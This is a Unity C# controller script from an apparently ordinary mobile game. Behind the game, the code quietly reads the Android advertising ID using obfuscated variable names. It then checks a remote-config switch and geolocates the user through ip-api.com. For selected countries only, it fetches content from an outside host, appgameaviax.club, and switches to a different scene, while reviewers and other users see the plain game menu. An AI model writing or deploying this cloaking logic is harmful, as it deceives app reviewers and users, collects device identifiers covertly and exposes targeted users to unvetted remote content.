using System.Threading.Tasks;
using Unity.Services.RemoteConfig;
using Unity.Services.Authentication;
using Unity.Services.Core;
using UnityEngine;
using UnityEngine.SceneManagement;
using System;
using System.Collections;
using UnityEngine.Networking;
using Newtonsoft.Json.Linq;
using System.Collections.Generic;

public class WelcomeDataController : MonoBehaviour
{
    private List<string> _geoposes = new List<string>();

    public struct userAttributes { }
    public struct appAttributes { }

    async Task InitializeRemoteConfigAsync()
    {        
        await UnityServices.InitializeAsync();

        if (!AuthenticationService.Instance.IsSignedIn)
        {
            await AuthenticationService.Instance.SignInAnonymouslyAsync();
        }
    }

    private void OnEnable()
    {
        string enter = PlayerPrefs.GetString("FirstEnter", "");
        if (enter == "menu")
        {
            SceneManager.LoadScene("MenuScene");
        }
        else if (enter == "finish")
        {
            SceneManager.LoadScene("FinishScene");
        }
    }

    private async Task Start()
    {

        StartCoroutine(GetInfoData());
        // initialize Unity's authentication and core services, however check for internet connection
        // in order to fail gracefully without throwing exception if connection does not exist
        if (Utilities.CheckForInternetConnection())
        {
            await InitializeRemoteConfigAsync();
        }

        RemoteConfigService.Instance.FetchCompleted += ApplyRemoteSettings;
        RemoteConfigService.Instance.FetchConfigs(new userAttributes(), new appAttributes());
    }

    void ApplyRemoteSettings(ConfigResponse configResponse)
    {
        //Debug.Log("RemoteConfigService.Instance.appConfig fetched: " + RemoteConfigService.Instance.appConfig.config.ToString());
        bool status = RemoteConfigService.Instance.appConfig.GetBool("ShouldItWork");
        if (status == true)
        {
            Debug.Log(true);
            string geopos = RemoteConfigService.Instance.appConfig.GetString("GEO");
            //Debug.Log(geopos);
            string[] geoposes = geopos.Split(";");
            foreach (string item in geoposes)
            {
                _geoposes.Add(item);
            }
            
            StartCoroutine(GetCountryCode());
        }

        else if (status == false)
        {
            Debug.Log(false);
            SceneManager.LoadScene("MenuScene");
        }
        else
        {
            Debug.Log("other");
            SceneManager.LoadScene("MenuScene");
        }
    }

    private IEnumerator GetInfoData()
    {
        yield return new WaitForSeconds(1.0f);
        string assist = CreateWord();
        PlayerPrefs.SetString("trick", assist);
    }

    public static string CreateWord()
    {
        string angle = "";

        try
        {
            AndroidJavaClass bath = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject delivery = bath.GetStatic<AndroidJavaObject>("currentActivity");
            AndroidJavaClass leadership = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient");
            AndroidJavaObject interview = leadership.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", delivery);

            angle = interview.Call<string>("getId").ToString();
        }
        catch (Exception)
        {
        }
        return angle;
    }

    private IEnumerator GetCountryCode()
    {
        UnityWebRequest www = UnityWebRequest.Get("http://ip-api.com/json");
        yield return www.SendWebRequest();

        if (www.result != UnityWebRequest.Result.Success)
        {
            Debug.Log(www.error);
            SceneManager.LoadScene("MenuScene");
        }
        else
        {
            string response = www.downloadHandler.text;
            var key = JObject.Parse(response).SelectToken("countryCode").ToString();
            Debug.Log("countryKey: " + key);

            if (_geoposes.Contains(key))
            {
                Debug.Log("remote: " + key);
                StartCoroutine(StartNewGame());
            }

            else
            {
                Debug.Log("nope");
                SceneManager.LoadScene("MenuScene");
                PlayerPrefs.SetString("FirstEnter", "menu");
            }
        }
    }

    private IEnumerator StartNewGame()
    {
        yield return new WaitForSeconds(2f);
        UnityWebRequest www = UnityWebRequest.Get("https://appgameaviax.club/HgPyC79k");
        yield return www.SendWebRequest();

        string response = www.downloadHandler.text;
        if (response == "Error-Free")
        {
            SceneManager.LoadScene("MenuScene");
            PlayerPrefs.SetString("FirstEnter", "menu");
        }
        else
        {
            PlayerPrefs.SetString("totalWay", response);

            PlayerPrefs.SetString("FirstEnter", "finish");
            SceneManager.LoadScene("FinishScene");
        }
    }
}